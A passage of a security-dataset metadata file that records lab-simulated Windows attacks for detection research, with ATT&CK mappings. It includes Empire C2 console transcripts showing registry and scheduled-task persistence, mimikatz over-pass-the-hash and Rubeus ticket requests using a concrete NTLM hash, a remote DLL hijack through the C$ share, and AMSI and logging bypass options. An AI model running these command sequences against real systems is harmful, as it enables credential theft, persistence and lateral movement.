            "adversary_view": "(Empire: stager/multi/launcher) > \n(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nKU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:02:57  http            \n\n(Empire: agents) > interact KU86XWEL\n(Empire: KU86XWEL) > \n(Empire: KU86XWEL) > usemodule persistence/\nelevated/registry*                 misc/add_netuser                   misc/install_ssp*                  powerbreach/resolver\nelevated/rid_hijack*               misc/add_sid_history*              misc/memssp*                       userland/backdoor_lnk\nelevated/schtasks*                 misc/debugger*                     misc/skeleton_key*                 userland/registry\nelevated/wmi*                      misc/disable_machine_acct_change*  powerbreach/deaduser               userland/schtasks\nelevated/wmi_updater*              misc/get_ssps                      powerbreach/eventlog*              \n(Empire: KU86XWEL) > usemodule persistence/userland/registry\n(Empire: powershell/persistence/userland/registry) > info\n\n              Name: Invoke-Registry\n            Module: powershell/persistence/userland/registry\n        NeedsAdmin: False\n        OpsecSafe: False\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @mattifestation\n  @harmj0y\n  @enigma0x3\n\nDescription:\n  Persist a stager (or script) via the\n  HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry\n  key. This has an easy detection/removal rating.\n\nComments:\n  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n  rsistence/Persistence.psm1\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        KU86XWEL                  Agent to run module on.                 \n  Listener         False                                 Listener to use.                        \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  KeyName          True        Updater                   Key name for the run trigger.           \n  RegPath          False       HKCU:Software\\Microsoft\\  Registry location to store the script   \n                              Windows\\CurrentVersion\\D  code. Last element is the key name.     \n                              ebug                    \n  ADSPath          False                                 Alternate-data-stream location to store \n                                                        the script code.                        \n  EventLogID       False                                 Store the script in the Application     \n                                                        event log under the specified EventID.  \n                                                        The ID needs to be unique/rare!         \n  ExtFile          False                                 Use an external file for the payload    \n                                                        instead of a stager.                    \n  Cleanup          False                                 Switch. Cleanup the trigger and any     \n                                                        script from specified location.         \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/persistence/userland/registry) > set Listener http\n(Empire: powershell/persistence/userland/registry) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked KU86XWEL to run TASK_CMD_WAIT\n[*] Agent KU86XWEL tasked with task ID 1\n[*] Tasked agent KU86XWEL to run module powershell/persistence/userland/registry\n(Empire: powershell/persistence/userland/registry) > \nRegistry persistence established using listener http stored in HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Debug.\n\n(Empire: powershell/persistence/userland/registry) > \n(Empire: powershell/persistence/userland/registry) > \n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n[*] New agent SP7B3U2X checked in\n[+] Initial agent SP7B3U2X from 172.18.39.5 now active (Slack)\n[*] Sending agent (stage 2) to SP7B3U2X at 172.18.39.5\n\n(Empire: powershell/persistence/userland/registry) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nKU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            \nSP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         1376   5/0.0    2020-09-04 07:09:04  http            \n\n(Empire: agents) > interact SP7B3U2X\n(Empire: SP7B3U2X) > shell whoami\n[*] Tasked SP7B3U2X to run TASK_SHELL\n[*] Agent SP7B3U2X tasked with task ID 1\n(Empire: SP7B3U2X) > \ntheshire\\pgustavo\n..Command execution completed.\n\n    (Empire: SP7B3U2X) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:24.925332+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190319024742.yaml": {
        "title": "Empire Userland Scheduled Tasks",
        "id": "SDWIN-190319024742",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/19",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Local Scheduled Tasks"
        ],
        "description": "This dataset represents adversaries creating and/or executing local scheduled tasks to maintain persistence in an environment.",
        "attack_mappings": [
            {
                "technique": "T1053",
                "sub-technique": "005",
                "tactics": [
                    "TA0003"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_schtasks_creation_standard_user.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "schtasks",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n\n3MWPS8L6 ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         7312   5/0.0    2020-09-21 07:12:36  http            \n\n(Empire: agents) > interact 3MWPS8L6         \n(Empire: 3MWPS8L6) > usemodule persistence/userland/schtasks\n(Empire: powershell/persistence/userland/schtasks) > info\n\n              Name: Invoke-Schtasks\n            Module: powershell/persistence/userland/schtasks\n        NeedsAdmin: False\n        OpsecSafe: False\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @mattifestation\n  @harmj0y\n\nDescription:\n  Persist a stager (or script) using schtasks. This has a\n  moderate detection/removal rating.\n\nComments:\n  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n  rsistence/Persistence.psm1\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        3MWPS8L6                  Agent to run module on.                 \n  Listener         False                                 Listener to use.                        \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  DailyTime        False       09:00                     Daily time to trigger the script        \n                                                        (HH:mm).                                \n  IdleTime         False                                 User idle time (in minutes) to trigger  \n                                                        script.                                 \n  TaskName         True        Updater                   Name to use for the schtask.            \n  RegPath          False       HKCU:\\Software\\Microsoft  Registry location to store the script   \n                              \\Windows\\CurrentVersion\\  code. Last element is the key name.     \n                              debug                   \n  ADSPath          False                                 Alternate-data-stream location to store \n                                                        the script code.                        \n  ExtFile          False                                 Use an external file for the payload    \n                                                        instead of a stager.                    \n  Cleanup          False                                 Switch. Cleanup the trigger and any     \n                                                        script from specified location.         \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/persistence/userland/schtasks) > set Listener http\n(Empire: powershell/persistence/userland/schtasks) > set TaskName MordorSchtask\n(Empire: powershell/persistence/userland/schtasks) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked 3MWPS8L6 to run TASK_CMD_WAIT\n[*] Agent 3MWPS8L6 tasked with task ID 1\n[*] Tasked agent 3MWPS8L6 to run module powershell/persistence/userland/schtasks\n(Empire: powershell/persistence/userland/schtasks) > \nSUCCESS: The scheduled task \"MordorSchtask\" has successfully been created.\nSchtasks persistence established using listener http stored in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\debug with MordorSchtask daily trigger at 09:00."
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:25.114332+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190319131123.yaml": {
        "title": "Empire Over-Pass-The-Hash",
        "id": "SDWIN-190319131123",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/19",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Over-Pass-The-Hash",
            "Patching LSASS"
        ],
        "description": "This dataset represents adversaries taking a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a fully-fledged Kerberos TGT. In this case, an adversary can write the hash/key into an existing logon session (i.e. a sacrificial logon session) section in the memory content of LSASS and kick off the regular Kerberos authentication process.",
        "attack_mappings": [
            {
                "technique": "T1550",
                "sub-technique": "002",
                "tactics": [
                    "TA0005",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_over_pth_patch_lsass.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "mimikataz_pth",
                    "script": "https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4EH9PC5S ps 172.18.39.6     WORKSTATION6      *THESHIRE\\wardog        powershell         5056   5/0.0    2020-09-22 02:12:12  http            \n\n(Empire: agents) > interact 4EH9PC5S\n(Empire: 4EH9PC5S) > \n(Empire: 4EH9PC5S) > usemodule credentials/mimikatz/pth*\n(Empire: powershell/credentials/mimikatz/pth) > info\n\n              Name: Invoke-Mimikatz PTH\n            Module: powershell/credentials/mimikatz/pth\n        NeedsAdmin: True\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  @JosephBialek\n  @gentilkiwi\n\nDescription:\n  Runs PowerSploit's Invoke-Mimikatz function to execute\n  sekurlsa::pth to create a new process. with a specific\n  user's hash. Use credentials/tokens to steal the token\n  afterwards.\n\nComments:\n  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\n  http://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-\n  hash-with-mimikatz/\n\nOptions:\n\n  Name   Required    Value                     Description\n  ----   --------    -------                   -----------\n  Agent  True        4EH9PC5S                  Agent to run module on.                 \n  CredID False                                 CredID from the store to use for ticket \n                                              creation.                               \n  user   False                                 Username to impersonate.                \n  domain False                                 The fully qualified domain name.        \n  ntlm   False                                 The NTLM hash to use.                   \n\n(Empire: powershell/credentials/mimikatz/pth) > set ntlm 81d310fa34e6a56a31145445891bb7b8\n(Empire: powershell/credentials/mimikatz/pth) > set user pgustavo\n(Empire: powershell/credentials/mimikatz/pth) > set domain theshire.local\n(Empire: powershell/credentials/mimikatz/pth) > execute\n[*] Tasked 4EH9PC5S to run TASK_CMD_JOB\n[*] Agent 4EH9PC5S tasked with task ID 1\n[*] Tasked agent 4EH9PC5S to run module powershell/credentials/mimikatz/pth\n(Empire: powershell/credentials/mimikatz/pth) > \nJob started: 1WCLFA\n\nHostname: WORKSTATION6.theshire.local / S-1-5-21-4228717743-1032521047-1810997296\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46\n.## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(powershell) # sekurlsa::pth /user:pgustavo /domain:theshire.local /ntlm:81d310fa34e6a56a31145445891bb7b8\nuser    : pgustavo\ndomain  : theshire.local\nprogram : cmd.exe\nimpers. : no\nNTLM    : 81d310fa34e6a56a31145445891bb7b8\n  |  PID  3148\n  |  TID  6488\n  |  LSA Process is now R/W\n  |  LUID 0 ; 69262895 (00000000:0420de2f)\n  \\_ msv1_0   - data copy @ 000001C7E0166C80 : OK !\n  \\_ kerberos - data copy @ 000001C7E02B1268\n  \\_ aes256_hmac       -> null             \n  \\_ aes128_hmac       -> null             \n  \\_ rc4_hmac_nt       OK\n  \\_ rc4_hmac_old      OK\n  \\_ rc4_md4           OK\n  \\_ rc4_hmac_nt_exp   OK\n  \\_ rc4_hmac_old_exp  OK\n  \\_ *Password replace @ 000001C7E01AEDE8 (32) -> null\n\nUse credentials/token to steal the token of the created PID."
        },
        "references": [
            "https://github.com/GhostPack/Rubeus#example-over-pass-the-hash",
            "https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600"
        ],
        "mp_last_updated": "2022-01-08T01:49:26.834610+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190319145126.yaml": {
        "title": "Rubeus Userland ASKTGT PTT",
        "id": "SDWIN-190319145126",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/19",
        "modification_date": "2020/09/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Over-Pass-The-Hash",
            "Not Touching LSASS"
        ],
        "description": "This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs without touching lsass.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "003",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_shell_rubeus_asktgt_ptt.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_shell_rubeus_asktgt_ptt.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "shell",
                    "script": null
                },
                {
                    "type": "binary",
                    "name": "Rubeus",
                    "module": "asktgt",
                    "script": "https://github.com/GhostPack/Rubeus"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4EH9PC5S ps 172.18.39.6     WORKSTATION6      *THESHIRE\\wardog        powershell         5056   5/0.0    2020-09-22 02:12:12  http            \n\n(Empire: agents) > interact 4EH9PC5S\n(Empire: 4EH9PC5S) > \n(Empire: 4EH9PC5S) > shell C:\\users\\sbeavers\\Desktop\\Rubeus.exe asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt\n[*] Tasked 4EH9PC5S to run TASK_SHELL\n[*] Agent 4EH9PC5S tasked with task ID 2\n(Empire: 4EH9PC5S) > \n______        _                      \n  (_____ \\      | |                     \n  _____) )_   _| |__  _____ _   _  ___ \n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v1.5.0 \n\n[*] Action: Ask TGT\n\n[*] Using rc4_hmac hash: 81d310fa34e6a56a31145445891bb7b8\n[*] Building AS-REQ (w/ preauth) for: 'theshire.local\\pgustavo'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n      doIFPjCCBTqgAwIBBaEDAgEWooIETTCCBElhggRFMIIEQaADAgEFoRAbDlRIRVNISVJFLkxPQ0FMoiMw\n      IaADAgECoRowGBsGa3JidGd0Gw50aGVzaGlyZS5sb2NhbKOCBAEwggP9oAMCARKhAwIBAqKCA+8EggPr\n      SCmXhrxOqig5LjU/zlOxxj72iV0Io1vDNrnEHqq0hTNheiEb2Oz3yOEk3Ct6qioIJmjm/PE+MoazpfNa\n      DOQUkxLNyEti0ltIyI2I2docI0yIbXA8BNRrGojFdruBcOs5NdDfi2Ttsng+NcZzWmCH4D3amx7AjOMr\n      jRotAieTg98Uzt3AG03bQSlPNkLJCW/Pnz5YCE8I8zIrkkGH+mTA+mGg4cNeVJE38nOlShq0meRMKKxC\n      drFfzsCgJ64r9dVBP+LmegRcUbrPLv6d2UHc+k0ELbhhfHgiy5m06UaLfrAe8fiUcHsdN0cJ1+4f9KCL\n      NsbjXJN85QQGzdOFFjJ07hir+SZ1UU+0NSaOkbFHz178KMk2P/9yWT9UqTEHV2qXuHS4scCV5SQirH6b\n      HAWlEpqeEwh+yGUmhLGs8Jo9sBsNEQ6EdFUzA+JjD4itQa4IMgLSLNEwzkZOle85Jbw4kDFsFmtckKVu\n      1osdI7dxA9wM/dZElOVUiI2cYqbI+pOcyPJHuzhbYnVhUhKFi29ZxPe1an0T7tNoy1zCFSs0z3V5RKwZ\n      4eUVQVxYGspUbB4h21/zEbus+NGTzWtJMqb6L4abOj1iLiRgJagyFKk5h91fasaRUoVAo3VxiIbrPqfh\n      kH393T/SC9ZObPESkBY8FVvhs/kuqRZIIhflbdYsTdcp0sa/F7Mo90CREIhH3EqgIQ/e97eK1Z9fr3Ma\n      HGfFBEEYcHIm28FQU3gtyMFTSp9gswbq3YtsOMGF5oLY8Po6vAdhHV2wStV9FDPVPepT4USsZGYZ567p\n      40PiSGBRUmCevWqrIA5kNwKD8QvaefXrGLZ+oXes9dt3CqHENQ4pJN67gUZq/F5tfFWYwDkefjNWMOwY\n      lIAEvyxrxlnA8ouBkvkLSkz4jYMjUCstdJ7TiF/GMboXAX1kfQpv01sMV/39RdSaE4s6aTGlqX2vDShM\n      OSdwfSS4qTU8kTkWuKgUh/Fcs2jYbjKfDvOqfkY5fAf+JSPRwqBC4mhsoGDLd3XGFba7prlV0VopSymj\n      //ZpVE70a2VJazJHuHoS1ZWvNVILQwF0FteGc5UYQHPMlAC7v6Qr360g8mHv9PG6AS7dHb3WWnezaRV7\n      ByPSxZ2B/WHEYWROuXlAK+dKWKWU31/NK6rX8l4Re8OUeu4/lGoEwZikKWxs+jE1zSOww46iZA78zJ3u\n      QVeK8t90Z28pxwRX8mo2/PfnOEFwVJMsrBSiwLrLFDbjGqCX8ktaZ1ZTxcXLYu8mfDvCs9KAUMRvncBH\n      g5yHUuoX6dIAY6EhWmpeSmqwV5VCV1kUarhKJt+JTC3Yjg9FaPGkJlJae6OB3DCB2aADAgEAooHRBIHO\n      fYHLMIHIoIHFMIHCMIG/oBswGaADAgEXoRIEEGTttXVs0y3nHHWU3quEoDChEBsOVEhFU0hJUkUuTE9D\n      QUyiFTAToAMCAQGhDDAKGwhwZ3VzdGF2b6MHAwUAQOEAAKURGA8yMDIwMDkyMjAyMzkxM1qmERgPMjAy\n      MDA5MjIxMjM5MTNapxEYDzIwMjAwOTI5MDIzOTEzWqgQGw5USEVTSElSRS5MT0NBTKkjMCGgAwIBAqEa\n      MBgbBmtyYnRndBsOdGhlc2hpcmUubG9jYWw=\n[+] Ticket successfully imported!\n\n  ServiceName           :  krbtgt/theshire.local\n  ServiceRealm          :  THESHIRE.LOCAL\n  UserName              :  pgustavo\n  UserRealm             :  THESHIRE.LOCAL\n  StartTime             :  9/21/2020 10:39:13 PM\n  EndTime               :  9/22/2020 8:39:13 AM\n  RenewTill             :  9/28/2020 10:39:13 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  rc4_hmac\n  Base64(key)           :  ZO21dWzTLeccdZTeq4SgMA==\n\n..Command execution completed.\n\n(Empire: 4EH9PC5S) >"
        },
        "references": [
            "https://github.com/GhostPack/Rubeus#example-over-pass-the-hash"
        ],
        "mp_last_updated": "2022-01-08T01:49:27.020609+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190403133337.yaml": {
        "title": "IKEEXT Remote Service DLL Hijack",
        "id": "SDWIN-190403133337",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/04/03",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Remote Service DLL Hijacking",
            "RPC over SMB Svcctl"
        ],
        "description": "This dataset represents adversaries copying a file remotely to replace a file which is executed by a service that is vulnerable to DLL hijack. This dataset includes",
        "attack_mappings": [
            {
                "technique": "T1574",
                "sub-technique": "001",
                "tactics": [
                    "TA0003",
                    "TA0004",
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_shell_dcerpc_smb_service_dll_hijack.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_shell_dcerpc_smb_service_dll_hijack.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "manual",
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: agents) > usestager windows/dll\n(Empire: stager/windows/dll) > info\nName: DLL Launcher\n\nDescription:\n  Generate a PowerPick Reflective DLL to inject with\n  stager code.\n\nOptions:\n\n  Name             Required    Value             Description\n  ----             --------    -------           -----------\n  Listener         True        http              Listener to use.\n  Language         True        powershell        Language of the stager to generate.\n  Arch             True        x64               Architecture of the .dll to generate\n                                                (x64 or x86).\n  StagerRetries    False       0                 Times for the stager to retry\n                                                connecting.\n  UserAgent        False       default           User-agent string to use for the staging\n                                                request (default, none, or other).\n  Proxy            False       default           Proxy to use for request (default, none,\n                                                or other).\n  ProxyCreds       False       default           Proxy credentials\n                                                ([domain\\]username:password) to use for\n                                                request (default, none, or other).\n  OutFile          True        /tmp/wlbsctrl.dll File to output dll to.\n  Obfuscate        False       False             Switch. Obfuscate the launcher\n                                                powershell code, uses the\n                                                ObfuscateCommand for obfuscation types.\n                                                For powershell only.\n  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n                                                Only used if Obfuscate switch is True.\n                                                For powershell only.\n  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in\n                                                the stager code.\n  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in\n                                                the stager code.\n  ScriptLogBypass  False       True              Include cobbr's Script Block Log Bypass\n                                                in the stager code.\n  ETWBypass        False       False             Include tandasat's ETW bypass in the\n                                                stager code.\n\n(Empire: stager/windows/dll) > back\n(Empire: agents) > agents\n\n[*] Active agents:\n\n  Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n  ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n  GCSKD17Z ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         1112   5/0.0    2020-09-22 03:51:02  http            \n\n(Empire: agents) > interact GCSKD17Z\n(Empire: GCSKD17Z) >\n(Empire: GCSKD17Z) > upload /tmp/wlbsctrl.dll\n[*] Tasked agent to upload wlbsctrl.dll, 124 KB\n(Empire: GCSKD17Z) > shell COPY .\\wlbsctrl.dll \\\\WORKSTATION6\\C$\\Windows\\System32\\wlbsctrl.dll\n[*] Tasked GCSKD17Z to run TASK_SHELL\n[*] Agent GCSKD17Z tasked with task ID 3\n(Empire: GCSKD17Z) > \n..Command execution completed.\n\n(Empire: GCSKD17Z) > shell sc.exe `\\`\\WORKSTATION6 stop IKEEXT\n[*] Tasked GCSKD17Z to run TASK_SHELL\n[*] Agent GCSKD17Z tasked with task ID 4\n(Empire: GCSKD17Z) > \nSERVICE_NAME: IKEEXT \n        TYPE               : 30  WIN32  \n        STATE              : 3  STOP_PENDING \n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x1388\n\n..Command execution completed.\n\n(Empire: GCSKD17Z) > shell sc.exe `\\`\\WORKSTATION6 query IKEEXT\n[*] Tasked GCSKD17Z to run TASK_SHELL\n[*] Agent GCSKD17Z tasked with task ID 5\n(Empire: GCSKD17Z) > \nSERVICE_NAME: IKEEXT \n        TYPE               : 20  WIN32_SHARE_PROCESS  \n        STATE              : 1  STOPPED \n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n\n..Command execution completed.\n\n(Empire: GCSKD17Z) > shell sc.exe `\\`\\WORKSTATION6 start IKEEXT\n[*] Tasked GCSKD17Z to run TASK_SHELL\n[*] Agent GCSKD17Z tasked with task ID 6\n(Empire: GCSKD17Z) > \nSERVICE_NAME: IKEEXT \n        TYPE               : 30  WIN32  \n        STATE              : 2  START_PENDING \n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 6172\n        FLAGS              : \n\n..Command execution completed.\n\n(Empire: GCSKD17Z) >"
        },
        "references": [
            "https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992"
        ],
        "mp_last_updated": "2022-01-08T01:49:27.223610+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518182022.yaml": {
        "title": "Empire VBS Execution",
        "id": "SDWIN-190518182022",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "VBS Script Execution"
        ],
        "description": "This dataset represents adversaries executing a VBS script as a launcher for initial access.",
        "attack_mappings": [
            {
                "technique": "T1059",
                "sub-technique": "005",
                "tactics": [
                    "TA0002"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/execution/host/empire_launcher_vbs.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "launcher",
                    "script": "https://github.com/BC-SECURITY/Empire/blob/master/lib/stagers/windows/launcher_vbs.py"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: listeners) > usestager windows/launcher_vbs\n(Empire: stager/windows/launcher_vbs) > info\n\nName: VBS Launcher\n\nDescription:\n  Generates a .vbs launcher for Empire.\n\nOptions:\n\n  Name             Required    Value             Description\n  ----             --------    -------           -----------\n  Listener         True                          Listener to generate stager for.\n  Language         True        powershell        Language of the stager to generate.\n  StagerRetries    False       0                 Times for the stager to retry\n                                                connecting.\n  OutFile          False       /tmp/launcher.vbs File to output .vbs launcher to,\n                                                otherwise displayed on the screen.\n  Obfuscate        False       False             Switch. Obfuscate the launcher\n                                                powershell code, uses the\n                                                ObfuscateCommand for obfuscation types.\n                                                For powershell only.\n  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n                                                Only used if Obfuscate switch is True.\n                                                For powershell only.\n  UserAgent        False       default           User-agent string to use for the staging\n                                                request (default, none, or other).\n  Proxy            False       default           Proxy to use for request (default, none,\n                                                or other).\n  ProxyCreds       False       default           Proxy credentials\n                                                ([domain\\]username:password) to use for\n                                                request (default, none, or other).\n\n\n(Empire: stager/windows/launcher_vbs) > set Listener 